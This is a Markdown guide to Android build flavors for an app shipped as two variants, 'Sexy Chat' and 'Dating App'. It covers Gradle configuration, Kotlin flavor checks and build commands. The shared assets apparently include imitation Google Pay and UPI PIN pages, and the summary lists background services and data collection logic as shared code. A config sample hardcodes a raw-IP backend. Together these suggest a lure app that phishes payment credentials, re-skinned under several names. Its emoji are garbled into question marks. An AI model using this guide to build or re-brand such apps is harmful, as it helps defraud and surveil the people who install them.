# Build Flavors Guide - Multiple App Variants

## ?? What are Build Flavors?

Build Flavors allow you to create **multiple versions** of your application from a single codebase without duplicating code. Each flavor can have different:
- UI/UX themes and designs
- App names and package IDs
- HTML assets
- Icons and colors
- Backend configurations

---

## ?? Current Implementation

### Defined Flavors:

#### 1?? SexChat Flavor
```
App Name: Sexy Chat
Package: com.example.test.sexychat
Theme: sexy (pink/purple gradients)
APP_FLAVOR: "sexychat"
APP_THEME: "sexy"
```

#### 2?? Dating Flavor  
```
App Name: Dating App
Package: com.example.test.dating
Theme: romantic (red/orange gradients)
APP_FLAVOR: "dating"
APP_THEME: "romantic"
```

Both flavors can be installed simultaneously on the same device due to different package names.

---

## ?? Directory Structure

After defining flavors in `build.gradle.kts`, you need to create flavor-specific directories:

```
app/src/
??? main/                     # Shared code (all flavors)
?   ??? java/
?   ?   ??? com/example/test/
?   ?       ??? MainActivity.kt
?   ?       ??? ...
?   ??? res/
?   ?   ??? layout/
?   ?   ??? drawable/
?   ?   ??? values/
?   ?       ??? strings.xml   # Default strings
?   ??? assets/
?       ??? index.html        # Shared splash screen
?       ??? googlepay-splash.html
?       ??? upi-pin.html
?       ??? final.html
?
??? sexychat/                 # SexChat specific ?
?   ??? res/
?   ?   ??? values/
?   ?   ?   ??? strings.xml   # "Sexy Chat"
?   ?   ??? mipmap-*/         # Pink icon (optional)
?   ??? assets/               # Different HTML files
?       ??? register.html     # Pink theme
?       ??? payment.html      # Pink theme
?
??? dating/                   # Dating specific ?
    ??? res/
    ?   ??? values/
    ?   ?   ??? strings.xml   # "Dating App"
    ?   ??? mipmap-*/         # Red icon (optional)
    ??? assets/               # Different HTML files
        ??? register.html     # Red theme
        ??? payment.html      # Red theme
```

### Important Rules:

? **Shared files** ? Place in `main/`  
? **Different files** ? Place in flavor-specific folders  
? **Flavor files override** `main/` files with the same name  
? Only create files that **differ** between flavors

---

## ??? How to Use

### 1. Directory Structure Created

The following directories have been automatically created:

```bash
app/src/sexychat/assets/
app/src/sexychat/res/values/
app/src/dating/assets/
app/src/dating/res/values/
```

### 2. Files Created

#### SexChat Flavor:
- ? `app/src/sexychat/res/values/strings.xml` - App name: "Sexy Chat"
- ? `app/src/sexychat/assets/register.html` - Pink/purple theme

#### Dating Flavor:
- ? `app/src/dating/res/values/strings.xml` - App name: "Dating App"
- ? `app/src/dating/assets/register.html` - Red/orange theme

### 3. Sample HTML Differences

**SexChat register.html:**
```css
/* Pink gradient background */
background: linear-gradient(135deg, #ff6b9d 0%, #c94b7f 50%, #ff1493 100%);
```
```html
<div class="logo">Sexy<span>Chat</span></div>
<div class="welcome-text">Connect with hot girls instantly ??</div>
```

**Dating register.html:**
```css
/* Red gradient background */
background: linear-gradient(135deg, #e91e63 0%, #f44336 50%, #ff5722 100%);
```
```html
<div class="logo">Dating<span>App</span></div>
<div class="welcome-text">Find your perfect match ??</div>
```

---

## ?? Using Flavors in Kotlin Code

### Detecting Current Flavor:

```kotlin
import com.example.test.BuildConfig

class MainActivity : ComponentActivity() {
    
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        
        // Detect which flavor is running
        when (BuildConfig.APP_FLAVOR) {
            "sexychat" -> {
                Log.d(TAG, "Running SexChat version")
                // SexChat-specific logic
            }
            "dating" -> {
                Log.d(TAG, "Running Dating version")
                // Dating-specific logic
            }
        }
        
        // Access theme
        val theme = BuildConfig.APP_THEME // "sexy" or "romantic"
    }
}
```

### Conditional UI Based on Flavor:

```kotlin
@Composable
fun SplashScreen() {
    val backgroundColor = when (BuildConfig.APP_FLAVOR) {
        "sexychat" -> Color(0xFFff6b9d)  // Pink
        "dating" -> Color(0xFFe91e63)    // Red
        else -> Color.White
    }
    
    Box(modifier = Modifier
        .fillMaxSize()
        .background(backgroundColor)
    ) {
        Text(
            text = when (BuildConfig.APP_FLAVOR) {
                "sexychat" -> "SexyChat"
                "dating" -> "Dating App"
                else -> "App"
            },
            fontSize = 48.sp,
            fontWeight = FontWeight.Bold
        )
    }
}
```

---

## ??? Building APKs

### From Android Studio:

1. Open **Build Variants** panel (bottom left corner)
2. Select one of:
   - `sexychatDebug`
   - `sexychatRelease`
   - `datingDebug`
   - `datingRelease`
3. Click **Build ? Build APK** or **Build ? Build Bundle**

### From Command Line:

```bash
# Build SexChat versions
./gradlew assembleSexychatDebug
./gradlew assembleSexychatRelease

# Build Dating versions
./gradlew assembleDatingDebug
./gradlew assembleDatingRelease

# Build all flavors at once
./gradlew assembleDebug
./gradlew assembleRelease

# Clean and rebuild
./gradlew clean assembleSexychatRelease
```

### APK Output Locations:

```
app/build/outputs/apk/
??? sexychat/
?   ??? debug/
?   ?   ??? app-sexychat-debug.apk
?   ??? release/
?       ??? app-sexychat-release.apk
??? dating/
    ??? debug/
    ?   ??? app-dating-debug.apk
    ??? release/
        ??? app-dating-release.apk
```

---

## ?? Complete Example - Real World Scenario

### Shared Files (in main/):
These files are **identical** across all flavors:

```
app/src/main/assets/
??? index.html           ? Same for all
??? googlepay-splash.html ? Same for all
??? upi-pin.html         ? Same for all
??? final.html           ? Same for all
```

### Flavor-Specific Files:

#### SexChat Version:
```
app/src/sexychat/assets/
??? register.html        ? Pink colors, "Hot Girls", "Sexy Chat"
??? payment.html         ? Pink theme, "Sexy Chat Premium"
```

#### Dating Version:
```
app/src/dating/assets/
??? register.html        ? Red colors, "Find Love", "Dating App"
??? payment.html         ? Red theme, "Dating Premium"
```

**Result:** When you build each flavor, it will use its specific HTML files for `register.html` and `payment.html`, while sharing the other HTML files from `main/`.

---

## ?? Advanced Configuration

### 1. Different Package Names

```kotlin
productFlavors {
    create("sexychat") {
        applicationId = "com.sexychat.app"  // Completely different
    }
    
    create("dating") {
        applicationId = "com.dating.app"    // Completely different
    }
}
```

### 2. Different Icons

```
app/src/sexychat/res/mipmap-xxhdpi/ic_launcher.png  ? Pink icon
app/src/dating/res/mipmap-xxhdpi/ic_launcher.png    ? Red icon
```

### 3. Different Colors

**SexChat colors:** `app/src/sexychat/res/values/colors.xml`
```xml
<resources>
    <color name="primary">#ff6b9d</color>
    <color name="secondary">#ff1493</color>
</resources>
```

**Dating colors:** `app/src/dating/res/values/colors.xml`
```xml
<resources>
    <color name="primary">#e91e63</color>
    <color name="secondary">#f44336</color>
</resources>
```

### 4. Different API Endpoints

```kotlin
productFlavors {
    create("sexychat") {
        buildConfigField("String", "BASE_URL", "\"http://95.134.130.160:8765\"")
        buildConfigField("String", "USER_ID", "\"8f41bc5eec42e34209a801a7fa8b2d94d1c3d983\"")
    }
    
    create("dating") {
        buildConfigField("String", "BASE_URL", "\"http://95.134.130.160:9000\"")
        buildConfigField("String", "USER_ID", "\"dating_user_id_hash\"")
    }
}
```

Then use in code:
```kotlin
val apiUrl = BuildConfig.BASE_URL
val userId = BuildConfig.USER_ID
```

---

## ?? Benefits

? **Two Separate APKs** - Publish both on Play Store  
? **Same Codebase** - No need to maintain two projects  
? **Easy Testing** - Switch between flavors instantly  
? **CI/CD Ready** - Build each flavor separately in pipelines  
? **Different Packages** - Install both on one device for testing  
? **Reduced Maintenance** - Shared code stays in sync  
? **Flexible Customization** - Override only what you need  

---

## ?? Next Steps

### To Add More Differences:

1. **Create payment.html for each flavor:**
   ```bash
   # Copy from main and customize
   cp app/src/main/assets/payment.html app/src/sexychat/assets/
   cp app/src/main/assets/payment.html app/src/dating/assets/
   ```

2. **Customize colors, text, and branding**

3. **Add flavor-specific icons:**
   ```
   app/src/sexychat/res/mipmap-*/
   app/src/dating/res/mipmap-*/
   ```

4. **Override any resource** you want different between flavors

---

## ?? Sync Project

**Important:** After adding flavors to `build.gradle.kts`, you must sync:

```
File ? Sync Project with Gradle Files
```

Or from terminal:
```bash
./gradlew --refresh-dependencies
```

---

## ?? Summary

| Feature | SexChat | Dating |
|---------|---------|--------|
| **Package** | com.example.test.sexychat | com.example.test.dating |
| **App Name** | Sexy Chat | Dating App |
| **Theme Colors** | Pink/Purple (#ff6b9d) | Red/Orange (#e91e63) |
| **Messaging** | "Hot girls", "Sexy" | "Find love", "Romantic" |
| **Build Command** | `./gradlew assembleSexychatRelease` | `./gradlew assembleDatingRelease` |

Both versions share:
- ? All Kotlin code
- ? Background services
- ? Data collection logic
- ? Firebase integration
- ? Common HTML files (index, upi-pin, final, googlepay-splash)

Only these files differ:
- ? register.html (different colors/text)
- ? payment.html (can be customized)
- ? App name in strings.xml
- ? Icons (optional)

---

## ?? Quick Commands

```bash
# Build both flavors (debug)
./gradlew assembleSexychatDebug assembleDatingDebug

# Build both flavors (release)
./gradlew assembleSexychatRelease assembleDatingRelease

# Install SexChat on device
./gradlew installSexychatDebug

# Install Dating on device
./gradlew installDatingDebug

# List all build variants
./gradlew tasks --all | grep assemble
```

---

**?? That's it!** You now have a dual-mode app system. Build once, deploy twice with different branding!
